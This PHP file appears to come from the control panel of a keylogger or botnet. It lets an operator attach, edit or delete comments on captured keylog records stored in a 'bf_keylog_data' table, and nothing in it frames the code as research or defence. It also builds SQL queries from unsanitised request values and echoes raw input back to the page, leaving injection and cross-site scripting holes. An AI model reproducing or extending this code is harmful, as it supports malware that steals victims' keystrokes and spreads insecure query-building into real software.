<?php

if(!empty($Cur['id'])){
	$prog = $mysqli->query('SELECT * FROM bf_keylog_data WHERE (id = \''.$Cur['id'].'\') LIMIT 1');

	if($prog->id == $Cur['id']){		$comment = $mysqli->query('SELECT id,prefix,uid,uniq FROM bf_comments WHERE (prefix=\''.$prog->prefix.'\') AND (uid=\''.$prog->uid.'\') AND (uniq=\''.$prog->hash.'\') AND (type=\'9\') LIMIT 1');

		$_POST['text'] = str_replace("'", '', $_POST['text']);
	    $_POST['text'] = str_replace("\n", '<br />', $_POST['text']);

	    if($comment->prefix == $prog->prefix && $comment->uid == $prog->uid && $comment->uniq == $prog->hash){
	    	if(empty($_POST['text'])){
	    		$mysqli->query('delete from bf_comments where (id = \''.$comment->id.'\')');
	    	}else{
	    		$mysqli->query("update bf_comments set comment = '".$_POST['text']."' WHERE (id='".$comment->id."') LIMIT 1");
	    	}
		}else{
			if(!empty($_POST['text'])) $mysqli->query("INSERT INTO bf_comments (prefix, uid, uniq, comment, type, post_id) VALUES ('".$prog->prefix."', '".$prog->uid."', '".$prog->hash."', '".$_POST['text']."', '9', '".$_SESSION['user']->id."')");
		}

		if(empty($_POST['text'])){
			$_POST['text'] = ' ';
		}else{
			if(strpos($_POST['text'], '!') != 0){
				print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$Cur['id'].'\').style.color = \'red\';</script>');
			}else{
				print('<script type="text/javascript" language="javascript">document.getElementById(\'cg_'.$Cur['id'].'\').style.color = \'\';</script>');
			}
		}

		print($_POST['text']);
	}else{
		exit;
	}
}

?>